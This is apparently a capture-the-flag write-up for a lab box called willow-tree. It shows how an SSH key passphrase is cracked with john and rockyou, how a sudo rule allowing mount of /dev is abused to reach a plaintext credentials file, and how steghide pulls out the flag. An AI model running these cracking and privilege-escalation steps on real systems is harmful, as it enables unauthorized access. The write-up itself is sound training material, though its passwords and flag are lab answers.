# John
* We can crack the password for the ssh key with `ssh2john decrypted_rsa.key > key.john` and then `john key.john --wordlist=/usr/share/wordlists/rockyou.txt`
	* That quickly gives us the password `wildflower`:

# Privesc
* Running `sudo -l` shows us the following:
```
Matching Defaults entries for willow on willow-tree:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User willow may run the following commands on willow-tree:
    (ALL : ALL) NOPASSWD: /bin/mount /dev/*
```
* We can run `mount` as root without a password on anything in the `/dev` directory
	* Looking inside of it, we see a device called `hidden_backup`

* We can `mkdir backupFiles` and `sudo mount /dev/hidden_backup /home/willow/backupFiles/`
	* In it is a file called `creds.txt` with the following information:
```
root:7QvbvBTvwPspUK
willow:U0ZZJLGYhNAT2s
```

* Now we can log in as root with `su root` and the password `7QvbvBTvwPspUK`
* However, when we `cat /root/root.txt`, it gives us this:
```
This would be too easy, don't you think? I actually gave you the root flag some time ago.
You've got my password now -- go find your flag!
```

* After trying a few different things, doing some steganography on the user flag file did the trick (hence why we strangely had an image instead of a text file)

# Steganography
* We can extract from the user flag with `steghide extract -sf user.jpg -p 7QvbvBTvwPspUK`, which gives us the actual root flag: `THM{find_a_red_rose_on_the_grave}`
